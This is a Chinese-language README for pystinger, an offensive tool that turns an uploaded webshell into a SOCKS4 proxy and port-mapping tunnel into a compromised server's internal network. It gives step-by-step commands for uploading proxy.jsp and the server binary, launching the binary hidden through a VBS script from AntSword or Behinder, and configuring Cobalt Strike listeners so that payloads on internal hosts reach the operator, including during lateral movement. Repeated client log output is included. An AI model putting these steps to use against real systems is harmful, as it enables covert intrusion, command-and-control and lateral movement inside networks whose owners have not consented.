# 毒刺(pystinger)

毒刺(pystinger)通过webshell实现**内网SOCK4代理**,**端口映射**.

可直接用于metasploit-framework,viper,cobalt strike上线

主体使用python开发,当前支持php,jsp(x),aspx三种代理脚本.

# 使用方法

## SOCK4代理

* proxy.jsp上传到目标服务器,确保 [http://192.168.3.11:8080/proxy.jsp](http://192.168.3.11:8080/proxy.jsp) 可以访问,页面返回 stinger XXX!
* 将stinger_server.exe和stinger_server.vbs上传到目标服务器,蚁剑/冰蝎执行```stinger_server.vbs```启动服务端
> 修改vbs中exe路径,不要直接运行exe文件,会导致tcp断连
* stinger_client命令行执行```./stinger_client -w http://192.168.3.11:8080/proxy.jsp -l 0.0.0.0 -p 60000```
* 如下输出表示成功
```
root@kali:~# ./stinger_client -w http://192.168.3.11:8080/proxy.jsp -l 127.0.0.1 -p 60000
2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
2020-01-06 21:12:47,674 - INFO - 622 - Local listen check pass
2020-01-06 21:12:47,674 - INFO - 623 - Socks4a on 127.0.0.1:60000
2020-01-06 21:12:47,674 - INFO - 628 - WEBSHELL checking ...
2020-01-06 21:12:47,681 - INFO - 631 - WEBSHELL check pass
2020-01-06 21:12:47,681 - INFO - 632 - http://192.168.3.11:8080/proxy.jsp
2020-01-06 21:12:47,682 - INFO - 637 - REMOTE_SERVER checking ...
2020-01-06 21:12:47,696 - INFO - 644 - REMOTE_SERVER check pass
2020-01-06 21:12:47,696 - INFO - 645 - --- Sever Config ---
2020-01-06 21:12:47,696 - INFO - 647 - client_address_list => []
2020-01-06 21:12:47,696 - INFO - 647 - SERVER_LISTEN => 127.0.0.1:60010
2020-01-06 21:12:47,696 - INFO - 647 - LOG_LEVEL => INFO
2020-01-06 21:12:47,697 - INFO - 647 - MIRROR_LISTEN => 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 647 - mirror_address_list => []
2020-01-06 21:12:47,697 - INFO - 647 - READ_BUFF_SIZE => 51200
2020-01-06 21:12:47,697 - INFO - 673 - TARGET_ADDRESS : 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 677 - SLEEP_TIME : 0.01
2020-01-06 21:12:47,697 - INFO - 679 - --- RAT Config ---
2020-01-06 21:12:47,697 - INFO - 681 - Handler/LISTEN should listen on 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 683 - Payload should connect to 127.0.0.1:60020
2020-01-06 21:12:47,698 - WARNING - 111 - LoopThread start
2020-01-06 21:12:47,703 - WARNING - 502 - socks4a server start on 127.0.0.1:60000
2020-01-06 21:12:47,703 - WARNING - 509 - Socks4a ready to accept

```
* 此时已经在本地60000启动了一个192.168.3.11所在内网的socks4代理

## cobalt strike单主机上线

* proxy.jsp上传到目标服务器,确保 [http://192.168.3.11:8080/proxy.jsp](http://192.168.3.11:8080/proxy.jsp) 可以访问,页面返回 stinger XXX!
* 将stinger_server.exe和stinger_server.vbs上传到目标服务器,蚁剑/冰蝎执行```stinger_server.vbs```启动服务端
> 修改vbs中路径,不要直接运行exe文件,会导致tcp断连
* stinger_client命令行执行```./stinger_client -w http://192.168.3.11:8080/proxy.jsp -l 0.0.0.0 -p 60000```
* 如下输出表示成功
```
root@kali:~# ./stinger_client -w http://192.168.3.11:8080/proxy.jsp -l 127.0.0.1 -p 60000
2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
2020-01-06 21:12:47,674 - INFO - 622 - Local listen check pass
2020-01-06 21:12:47,674 - INFO - 623 - Socks4a on 127.0.0.1:60000
2020-01-06 21:12:47,674 - INFO - 628 - WEBSHELL checking ...
2020-01-06 21:12:47,681 - INFO - 631 - WEBSHELL check pass
2020-01-06 21:12:47,681 - INFO - 632 - http://192.168.3.11:8080/proxy.jsp
2020-01-06 21:12:47,682 - INFO - 637 - REMOTE_SERVER checking ...
2020-01-06 21:12:47,696 - INFO - 644 - REMOTE_SERVER check pass
2020-01-06 21:12:47,696 - INFO - 645 - --- Sever Config ---
2020-01-06 21:12:47,696 - INFO - 647 - client_address_list => []
2020-01-06 21:12:47,696 - INFO - 647 - SERVER_LISTEN => 127.0.0.1:60010
2020-01-06 21:12:47,696 - INFO - 647 - LOG_LEVEL => INFO
2020-01-06 21:12:47,697 - INFO - 647 - MIRROR_LISTEN => 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 647 - mirror_address_list => []
2020-01-06 21:12:47,697 - INFO - 647 - READ_BUFF_SIZE => 51200
2020-01-06 21:12:47,697 - INFO - 673 - TARGET_ADDRESS : 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 677 - SLEEP_TIME : 0.01
2020-01-06 21:12:47,697 - INFO - 679 - --- RAT Config ---
2020-01-06 21:12:47,697 - INFO - 681 - Handler/LISTEN should listen on 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 683 - Payload should connect to 127.0.0.1:60020
2020-01-06 21:12:47,698 - WARNING - 111 - LoopThread start
2020-01-06 21:12:47,703 - WARNING - 502 - socks4a server start on 127.0.0.1:60000
2020-01-06 21:12:47,703 - WARNING - 509 - Socks4a ready to accept
```
* cobalt strike添加监听,端口选择输出信息RAT Config中的Handler/LISTEN中的端口(通常为60020),beacons为127.0.0.1
* 生成payload,上传到主机运行后即可上线

## cobalt strike多主机上线

* proxy.jsp上传到目标服务器,确保 [http://192.168.3.11:8080/proxy.jsp](http://192.168.3.11:8080/proxy.jsp) 可以访问,页面返回 stinger XXX!
* 将stinger_server.exe上传到目标服务器
* 修改stinger_server.vbs,示例如下:
```
Set ws = CreateObject("Wscript.Shell")
ws.run "cmd /c D:\XXXXX\stinger_server.exe 192.168.3.11",vbhide
```
> 192.168.3.11可以改成0.0.0.0

* 蚁剑/冰蝎执行```stinger_server.vbs```启动服务端
* stinger_client命令行执行```./stinger_client -w http://192.168.3.11:8080/proxy.jsp -l 0.0.0.0 -p 60000```
* 如下输出表示成功
```
root@kali:~# ./stinger_client -w http://192.168.3.11:8080/proxy.jsp -l 127.0.0.1 -p 60000
2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
2020-01-06 21:12:47,674 - INFO - 622 - Local listen check pass
2020-01-06 21:12:47,674 - INFO - 623 - Socks4a on 127.0.0.1:60000
2020-01-06 21:12:47,674 - INFO - 628 - WEBSHELL checking ...
2020-01-06 21:12:47,681 - INFO - 631 - WEBSHELL check pass
2020-01-06 21:12:47,681 - INFO - 632 - http://192.168.3.11:8080/proxy.jsp
2020-01-06 21:12:47,682 - INFO - 637 - REMOTE_SERVER checking ...
2020-01-06 21:12:47,696 - INFO - 644 - REMOTE_SERVER check pass
2020-01-06 21:12:47,696 - INFO - 645 - --- Sever Config ---
2020-01-06 21:12:47,696 - INFO - 647 - client_address_list => []
2020-01-06 21:12:47,696 - INFO - 647 - SERVER_LISTEN => 127.0.0.1:60010
2020-01-06 21:12:47,696 - INFO - 647 - LOG_LEVEL => INFO
2020-01-06 21:12:47,697 - INFO - 647 - MIRROR_LISTEN => 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 647 - mirror_address_list => []
2020-01-06 21:12:47,697 - INFO - 647 - READ_BUFF_SIZE => 51200
2020-01-06 21:12:47,697 - INFO - 673 - TARGET_ADDRESS : 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 677 - SLEEP_TIME : 0.01
2020-01-06 21:12:47,697 - INFO - 679 - --- RAT Config ---
2020-01-06 21:12:47,697 - INFO - 681 - Handler/LISTEN should listen on 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 683 - Payload should connect to 192.168.3.11:60020
2020-01-06 21:12:47,698 - WARNING - 111 - LoopThread start
2020-01-06 21:12:47,703 - WARNING - 502 - socks4a server start on 127.0.0.1:60000
2020-01-06 21:12:47,703 - WARNING - 509 - Socks4a ready to accept
```
* cobalt strike添加监听,端口选择RAT Config中的Handler/LISTEN中的端口(通常为60020),beacons为192.168.3.11
* 生成payload,上传到主机运行后即可上线
* 横向移动到其他主机时可以将payload指向192.168.3.11:60020即可实现出网上线


# 相关工具
[https://github.com/nccgroup/ABPTTS](https://github.com/nccgroup/ABPTTS)

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

[https://github.com/SECFORCE/Tunna](https://github.com/SECFORCE/Tunna)

# 已测试
## stinger_server\stinger_client
* windows 
* linux
## proxy.jsp(x)/php/aspx
* php7.2 
* tomcat7.0 
* iis8.0

# 更新日志
**2.0**
更新时间: 2019-09-29
* 将socks4代理服务移动到客户端
* 不再支持端口转发功能

**2.1**
更新时间: 2020-01-07
* 支持CS上线功能(即端口映射功能)

